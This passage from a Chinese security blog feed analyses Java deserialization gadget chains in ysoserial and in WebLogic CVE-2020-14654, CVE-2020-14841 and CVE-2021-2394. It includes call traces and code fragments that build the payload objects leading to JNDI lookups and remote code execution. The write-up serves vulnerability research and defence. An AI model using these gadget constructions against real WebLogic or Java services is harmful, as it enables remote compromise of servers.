Reflections.getFieldValue(queue, <span class="string">"queue"</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="CommonsCollections4："><a href="#CommonsCollections4：" class="headerlink" title="CommonsCollections4："></a>CommonsCollections4：</h4><p>和CommonsCollections2一样，都是以TransformingComparator作为Comparator只不过后面没有调用invoke，而是利用了TrAXFilter.TrAXFilter，该方法对TransformerImpl进行了实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> TransformingComparator(chain));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="BeanShell1："><a href="#BeanShell1：" class="headerlink" title="BeanShell1："></a>BeanShell1：</h4><p>以PriorityQueue作为入口，其属性comparator被代理给XThis.Handler处理从而调用invoke。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">Object[] queue = <span class="keyword">new</span> Object[] &#123;<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">"queue"</span>, queue);</span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">"size"</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><h4 id="Jython1："><a href="#Jython1：" class="headerlink" title="Jython1："></a>Jython1：</h4><p>与BeanShell1类似，以PriorityQueue作为入口，其属性comparator被代理给PyFunction.Handler处理，从而调用invoke。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PyFunction handler = <span class="keyword">new</span> PyFunction(<span class="keyword">new</span> PyStringMap(), <span class="keyword">null</span>, codeobj);</span><br><span class="line">Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Comparator.class&#125;, handler);</span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">Object[] queue = <span class="keyword">new</span> Object[] &#123;<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">"queue"</span>, queue);</span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">"size"</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>除了上面的ysoserial，Weblogic CVE-2020-14654和CVE-2020-14841如下。</p><h4 id="Weblogic-CVE-2020-14654"><a href="#Weblogic-CVE-2020-14654" class="headerlink" title="Weblogic CVE-2020-14654"></a>Weblogic CVE-2020-14654</h4><p>以PriorityQueue作为入口，ExtractorComparator作为Comparator，调用ExtractorComparator.compare，可通过UniversalExtractor.extract调用invoke。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UniversalExtractor extractor = <span class="keyword">new</span> UniversalExtractor(<span class="string">"getDatabaseMetaData()"</span>, <span class="keyword">null</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">final</span> ExtractorComparator comparator = <span class="keyword">new</span> ExtractorComparator(extractor);</span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">Object[] q = <span class="keyword">new</span> Object[]&#123;rowSet, rowSet&#125;;</span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">"queue"</span>, q);</span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">"size"</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><h4 id="Weblogic-CVE-2020-14841"><a href="#Weblogic-CVE-2020-14841" class="headerlink" title="Weblogic CVE-2020-14841"></a>Weblogic CVE-2020-14841</h4><p>以PriorityQueue作为入口，ExtractorComparator作为Comparator，调用ExtractorComparator.compare，可通过LockVersionExtractor.extract调用invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LockVersionExtractor extractor = <span class="keyword">new</span> LockVersionExtractor(methodAttributeAccessor, <span class="string">"xxx"</span>);</span><br><span class="line">ExtractorComparator comparator = <span class="keyword">new</span> ExtractorComparator(extractor);</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">Object[] q = <span class="keyword">new</span> Object[]&#123;jdbcRowSet, <span class="number">1</span>&#125;;</span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">"queue"</span>, q);</span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">"size"</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>仔细观察其实可以看到每个PriorityQueue都是添加了2个元素，不难理解，在PriorityQueue.heapify中必须要有2个及以上元素才会调用siftDown，并且比较也必须是至少两个元素的比较。</p><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>在第三部分分析的所有gadget中，除了CommonsCollections4外，都有一个共同点：从<code>PriorityQueue.siftDownUsingComparator</code>调用比较器的compare方法，最终到危险方法Method.invoke，我们可以通过构造Comparator完成动态执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.siftDownUsingComparator -&gt; Comparator.compare -&gt; XxxComparator.compare -&gt;... -&gt;Method.invoke</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://zhuanlan.zhihu.com/p/25843530" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25843530</a><br><a href="https://blog.csdn.net/kobejayandy/article/details/46832797" target="_blank" rel="noopener">https://blog.csdn.net/kobejayandy/article/details/46832797</a><br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PriorityQueue </tag>
            
            <tag> ysoserial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic CVE-2021-2394和CVE-2020-14841分析</title>
      <link href="2021/08/13/WebLogic-CVE-2021-2394%E5%92%8CCVE-2020-14841%E5%88%86%E6%9E%90/"/>
      <url>2021/08/13/WebLogic-CVE-2021-2394%E5%92%8CCVE-2020-14841%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="CVE-2021-2394-Gadgets-分析"><a href="#CVE-2021-2394-Gadgets-分析" class="headerlink" title="CVE-2021-2394 Gadgets 分析"></a>CVE-2021-2394 Gadgets 分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">com.tangosol.coherence.servlet.AttributeHolder.readExternal</span><br><span class="line">  com.tangosol.util.aggregator.TopNAggregator$PartialResult.readExternal</span><br><span class="line">    com.tangosol.util.aggregator.TopNAggregator$PartialResult.add</span><br><span class="line">      com.tangosol.util.SortedBag.add</span><br><span class="line">        java.util.TreeMap.put</span><br><span class="line">          java.util.TreeMap.compare</span><br><span class="line">            com.tangosol.util.SortedBag$WrapperComparator.compare</span><br><span class="line">              com.tangosol.util.extractor.AbstractExtractor.compare</span><br><span class="line">                oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor.extract</span><br><span class="line">                  org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor.getAttributeValueFromObject</span><br><span class="line">                    java.lang.reflect.Method.invoke</span><br><span class="line">                      com.sun.rowset.JdbcRowSetImpl.connect</span><br><span class="line">                        javax.naming.InitialContext.lookup</span><br></pre></td></tr></table></figure><p>从入口到<code>FilterExtractor.extract</code>调用不再说了，跟之前<a href="https://www.anquanke.com/post/id/248770" target="_blank" rel="noopener">CVE-2021-2135</a>类似，通过<code>InitialContext.lookup</code>到ldap执行命令过程可以看下<a href="https://rita888.github.io/2021/08/06/RMI-LDAP-JNDI%E5%8F%8AJdbcRowSetImpl%E5%88%A9%E7%94%A8/#3%E3%80%81JNDI" target="_blank" rel="noopener">之前的分析</a>。这里主要分析下<code>FilterExtractor.extract</code>到<code>Method.invoke</code>及POC构造问题。</p><p><code>FilterExtractor.extract</code>中调用了attributeAccessor属性的initializeAttributes和getAttributeValueFromObject方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">extract</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Wrapper) &#123;</span><br><span class="line">        obj = ((Wrapper)obj).unwrap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.attributeAccessor.isInitialized()) &#123;</span><br><span class="line">        <span class="comment">// 调用attributeAccessor属性的initializeAttributes方法</span></span><br><span class="line">        <span class="keyword">this</span>.attributeAccessor.initializeAttributes(obj.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用attributeAccessor属性的getAttributeValueFromObject方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.attributeAccessor.getAttributeValueFromObject(obj);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FilterExtractor.InvalidObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果让attributeAccessor属性是MethodAttributeAccessor实例，那么就可以调用<code>MethodAttributeAccessor.getAttributeValueFromObject</code>，当不满足<code>PrivilegedAccessHelper.shouldUsePrivilegedAccess()</code>能够进一步调用invoke方法，这里注意<code>getAttributeValueFromObject(anObject, (Object[])null)</code>传入的参数是null，那么invoke调用的就是无参方法。当传入的anObject是JdbcRowSetImpl实例，this.getMethod是connect方法，则可以调用<code>JdbcRowSetImpl.connect</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getAttributeValueFromObject</span><span class="params">(Object anObject)</span> <span class="keyword">throws</span> DescriptorException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getAttributeValueFromObject(anObject, (Object[])<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getAttributeValueFromObject</span><span class="params">(Object anObject, Object[] parameters)</span> <span class="keyword">throws</span> DescriptorException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 当传入的anObject是JdbcRowSetImpl实例，this.getMethod是connect方法，则可以调用JdbcRowSetImpl.connect</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getMethod.invoke(anObject, parameters);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var6) &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getMethod属性本身是不可以序列化的，但是在反序列化时可以调用到<code>MethodAttributeAccessor.initializeAttributes</code>来完成赋值工作。initializeAttributes中使用Helper.getDeclaredMethod和getGetMethodName属性获取到Method对象并调用setGetMethod赋值给getMethod属性，而getMethodName属性是可以序列化的，在构造POC时可以设置为connect。</p><p>另外有一点值得注意：<code>this.isWriteOnly()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initializeAttributes</span><span class="params">(Class theJavaClass)</span> <span class="keyword">throws</span> DescriptorException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.initializeAttributes(theJavaClass, (Class[])<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initializeAttributes</span><span class="params">(Class theJavaClass, Class[] getParameterTypes)</span> <span class="keyword">throws</span> DescriptorException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getAttributeName() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> DescriptorException.attributeNameNotSpecified();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DescriptorException descriptorException;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Helper.getDeclaredMethod通过Class对象、方法名及参数获取一个Method对象</span></span><br><span class="line">            <span class="keyword">this</span>.setGetMethod(Helper.getDeclaredMethod(theJavaClass, <span class="keyword">this</span>.getGetMethodName(), getParameterTypes));</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.isWriteOnly()) &#123;</span><br><span class="line">                <span class="comment">//默认isWriteOnly是false，会调用setSetMethod</span></span><br><span class="line">                <span class="keyword">this</span>.setSetMethod(Helper.getDeclaredMethod(theJavaClass, <span class="keyword">this</span>.getSetMethodName(), <span class="keyword">this</span>.getSetMethodParameterTypes()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意，当isWriteOnly属性是false时会调用setSetMethod。在CVE-2020-14841中思路是将该属性直接设置为false，从而避免调用setSetMethod：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MethodAttributeAccessor methodAttributeAccessor = <span class="keyword">new</span> MethodAttributeAccessor();</span><br><span class="line">methodAttributeAccessor.setGetMethodName(<span class="string">"getDatabaseMetaData"</span>);</span><br><span class="line">methodAttributeAccessor.setIsWriteOnly(<span class="keyword">true</span>);</span><br><span class="line">methodAttributeAccessor.setAttributeName(<span class="string">"xxx"</span>);</span><br></pre></td></tr></table></figure><p>但是CVE-2021-2934不能直接这样，在<a href="https://cert.360.cn/report/detail?id=2d3b4207433c18ddf6d9607a57f92960" target="_blank" rel="noopener">360cert</a>中说明了这一点：因为MethodAttributeAccessor被加入了黑名单(笔者未验证)，所以思路是可以调用setSetMethod方法，我们在构造POC时需要设置setMethodName。</p><p>如何设置setMethodName？在initializeAttributes方法中，将<code>this.getSetMethodParameterTypes()</code>返回值作为方法的参数，最终会获取到<code>this.getMethod</code>代表的方法的返回值参数列表，因此我们需要关注下<code>JdbcRowSetImpl.connect</code>的返回值，connect会返回一个Connection对象，setConnection刚好以connection为参数，所以我们就可以设置setMethodName为setConnection。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class[] getSetMethodParameterTypes() &#123;</span><br><span class="line">    <span class="comment">// 返回getGetMethod方法的返回值类型的Class对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Class[]&#123;<span class="keyword">this</span>.getGetMethodReturnType()&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">getGetMethodReturnType</span><span class="params">()</span> <span class="keyword">throws</span> DescriptorException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getGetMethod() == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.getGetMethodName() != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.getGetMethodName().indexOf(<span class="string">"_persistence_"</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        AbstractSessionLog.getLog().log(<span class="number">1</span>, <span class="string">"no_weaved_vh_method_found_verify_weaving_and_module_order"</span>, <span class="keyword">this</span>.getGetMethodName(), (Object)<span class="keyword">null</span>, <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">throw</span> DescriptorException.nullPointerWhileGettingValueThruMethodAccessorCausedByWeavingNotOccurringBecauseOfModuleOrder(<span class="keyword">this</span>.getGetMethodName(), <span class="string">""</span>, (Throwable)<span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Class)AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedGetMethodReturnType(<span class="keyword">this</span>.getGetMethod()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException var1) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 返回getGetMethod方法的返回值类型</span></span><br><span class="line">        <span class="keyword">return</span> PrivilegedAccessHelper.getMethodReturnType(<span class="keyword">this</span>.getGetMethod());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，除了connect和setConnection还可以有prepare和setPreparedStatement：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">methodAttributeAccessor.setGetMethodName(<span class="string">"prepare"</span>);</span><br><span class="line">methodAttributeAccessor.setSetMethodName(<span class="string">"setPreparedStatement"</span>);</span><br></pre></td></tr></table></figure><p>既然上面提到了CVE-2020-14841，也顺便分析下。</p><h3 id="CVE-2020-14841"><a href="#CVE-2020-14841" class="headerlink" title="CVE-2020-14841"></a>CVE-2020-14841</h3><p>CVE-2020-14841的Gadget：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue.readObject</span><br><span class="line">  java.util.PriorityQueue.heapify</span><br><span class="line">    java.util.PriorityQueue.siftDown</span><br><span class="line">      java.util.PriorityQueue.siftDownUsingComparator</span><br><span class="line">        com.tangosol.util.comparator.ExtractorComparator.compare</span><br><span class="line">          oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor.extract</span><br><span class="line">            org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor.getAttributeValueFromObject</span><br><span class="line">              java.lang.reflect.Method.invoke</span><br><span class="line">                com.sun.rowset.JdbcRowSetImpl.connect</span><br><span class="line">                  javax.naming.InitialContext.lookup</span><br></pre></td></tr></table></figure><p><code>MethodAttributeAccessor.getAttributeValueFromObject</code>到<code>javax.naming.InitialContext.lookup</code>上面已经分析过了，不再赘述，主要分析下<code>PriorityQueue.readObject</code>到``LockVersionExtractor.extract`。</p><p>PriorityQueue是一个优先队列，本质是数组，在其内部定义了readObject，可自己处理序列化和反序列化。PriorityQueue反序列化时特点是先创建一个数组queue，然后再调用PriorityQueue.heapify进行排序。当内部属性Comparator有被赋值，处理排序时会通过PriorityQueue.heapify调用PriorityQueue.siftDownUsingComparator，节点之间用比较器Comparator的compare方法进行比较。所以当Comparator被赋值为ExtractorComparator，反序列化时会调用ExtractorComparator.compare。</p><p>ExtractorComparator.compare如下，内部调用了extract方法，当参数不是Entry实例，执行this.m_extractor.extract，构造ExtractorComparator的m_extractor属性为LockVersionExtractor实例，就能调用LockVersionExtractor.extract。LockVersionExtractor实现了ValueExtractor和ExternalizableLite，刚好满足序列化要求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// o1 not instanceof Entry -&gt; this.m_extractor.extract</span></span><br><span class="line">    Comparable a1 = o1 <span class="keyword">instanceof</span> Entry ? (Comparable)((Entry)o1).extract(<span class="keyword">this</span>.m_extractor) : (Comparable)<span class="keyword">this</span>.m_extractor.extract(o1);</span><br><span class="line">    Comparable a2 = o2 <span class="keyword">instanceof</span> Entry ? (Comparable)((Entry)o2).extract(<span class="keyword">this</span>.m_extractor) : (Comparable)<span class="keyword">this</span>.m_extractor.extract(o2);</span><br><span class="line">    <span class="keyword">if</span> (a1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> a2 == <span class="keyword">null</span> ? <span class="number">0</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a2 == <span class="keyword">null</span> ? <span class="number">1</span> : a1.compareTo(a2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LockVersionExtractor.extract方法如下，和FilterExtractor.extract一样，当arg0参数是JdbcRowSetImpl实例，最终可以调用JdbcRowSetImpl.connect。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">extract</span><span class="params">(Object arg0)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (arg0 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (arg0 <span class="keyword">instanceof</span> Wrapper) &#123;</span><br><span class="line">            arg0 = ((Wrapper)arg0).unwrap();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.accessor.isInitialized()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.accessor.initializeAttributes(arg0.getClass());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.accessor.getAttributeValueFromObject(arg0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下CVE-2020-14654，其实和CVE-2020-14841一样的，只不过LockVersionExtractor变成了UniversalExtractor，UniversalExtractor.extract中满足条件可调用invoke，类似的还有CVE-2020-2555。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://cert.360.cn/report/detail?id=2d3b4207433c18ddf6d9607a57f92960" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=2d3b4207433c18ddf6d9607a57f92960</a><br><a href="https://mp.weixin.qq.com/s/wFHhWvnCLm1xcWZIbv6O3A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wFHhWvnCLm1xcWZIbv6O3A</a><br><a href="https://blog.csdn.net/kobejayandy/article/details/46832797" target="_blank" rel="noopener">https://blog.csdn.net/kobejayandy/article/details/46832797</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-2394 </tag>
            
            <tag> CVE-2020-14841 </tag>
            
            <tag> CVE-2020-14654 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI、LDAP、JNDI及JdbcRowSetImpl利用</title>
      <link href="2021/08/06/RMI-LDAP-JNDI%E5%8F%8AJdbcRowSetImpl%E5%88%A9%E7%94%A8/"/>
      <url>2021/08/06/RMI-LDAP-JNDI%E5%8F%8AJdbcRowSetImpl%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、一些概念-RMI、LDAP、JNDI"><a href="#一、一些概念-RMI、LDAP、JNDI" class="headerlink" title="一、一些概念-RMI、LDAP、JNDI"></a>一、一些概念-RMI、LDAP、JNDI</h2><p>以前学过发现又有点忘了，温故而知新嘛，重新学下…</p><h3 id="1、RMI"><a href="#1、RMI" class="headerlink" title="1、RMI"></a>1、RMI</h3><p>Java RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于Java虚拟机，因此它仅支持从一个JVM到另一个JVM的调用.</p><p>回顾下：<a href="https://rita888.github.io/2020/06/14/Java%20RMI/" target="_blank" rel="noopener">https://rita888.github.io/2020/06/14/Java%20RMI/</a></p><blockquote><p>RMI有一个重要的特性是动态类加载机制，当本地CLASSPATH中无法找到相应的类时，会在指定的codebase里加载class。</p><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p></blockquote><p>简而言之RMI总共三个部分：</p><ul><li>Registry: 注册服务 提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</li><li>Server: 远程方法的提供者，并向Registry注册自身提供的服务</li><li>Client: 远程方法的消费者，从Registry获取远程方法的相关信息并且调用</li></ul><h3 id="2、LADP"><a href="#2、LADP" class="headerlink" title="2、LADP"></a>2、LADP</h3><p>LDAP（Light Directory Access 